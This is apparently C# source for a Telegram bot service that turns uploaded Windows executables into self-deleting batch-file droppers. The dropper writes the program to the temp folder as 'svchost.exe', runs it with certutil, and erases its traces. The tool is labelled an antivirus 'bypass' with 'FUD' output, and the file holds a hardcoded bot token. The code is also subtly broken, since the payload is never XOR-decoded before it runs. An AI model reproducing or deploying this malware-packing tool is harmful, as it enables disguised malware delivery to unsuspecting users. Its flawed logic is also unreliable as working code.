using Microsoft.AspNetCore.Mvc;
using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapGet("/", () => "🟢 v8.3 BAT BYPASS");

app.MapPost("/webhook", async ([FromBody] string body) =>
{
    var chatMatch = Regex.Match(body, @"""chat"":\s*\{\s*""id"":\s*(\d+)");
    var fileMatch = Regex.Match(body, @"""file_id"":\s*""([^""]+\.exe)""");
    
    if (chatMatch.Success && fileMatch.Success)
    {
        long chatId = long.Parse(chatMatch.Groups[1].Value);
        string fileId = fileMatch.Groups[1].Value;
        _ = ProcessFile(chatId, fileId);
    }
    
    return Results.Ok();
});

static async Task ProcessFile(long chatId, string fileId)
{
    using var http = new HttpClient();
    
    string fileResp = await http.GetStringAsync($"https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/getFile?file_id={fileId}");
    var pathMatch = Regex.Match(fileResp, @"""file_path"":\s*""([^""]+)""");
    string filePath = pathMatch.Groups[1].Value;
    
    byte[] exe = await http.GetByteArrayAsync($"https://api.telegram.org/file/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/{filePath}");
    
    byte[] encrypted = XorEncrypt(exe, 0xAB);
    
    string hexData = HexDump(encrypted);
    
    string batPayload = $@"
@echo off
cd /d %temp%
echo {hexData.Replace("\n", "\necho ")}>svchost.hex
certutil -decodehex svchost.hex svchost.exe
start svchost.exe
timeout /t 2 >nul
del svchost.*
del %0
";
    
    byte[] fudBytes = Encoding.UTF8.GetBytes(batPayload);
    
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(chatId.ToString()), "chat_id");
    form.Add(new ByteArrayContent(fudBytes), "document", "update-v8.3.bat");
    form.Add(new StringContent("🔥 v8.3 BAT BYPASS"), "caption");
    
    await http.PostAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/sendDocument", form);
}

static byte[] XorEncrypt(byte[] data, byte key)
{
    byte[] result = new byte[data.Length];
    for (int i = 0; i < data.Length; i++)
        result[i] = (byte)(data[i] ^ key);
    return result;
}

static string HexDump(byte[] data)
{
    var sb = new StringBuilder();
    for (int i = 0; i < data.Length; i++)
    {
        sb.AppendFormat("{0:X2}", data[i]);
        if (i % 32 == 31 || i == data.Length - 1)
            sb.AppendLine();
    }
    return sb.ToString().Replace("\r\n", "").Replace("\n", "");
}

app.Run();
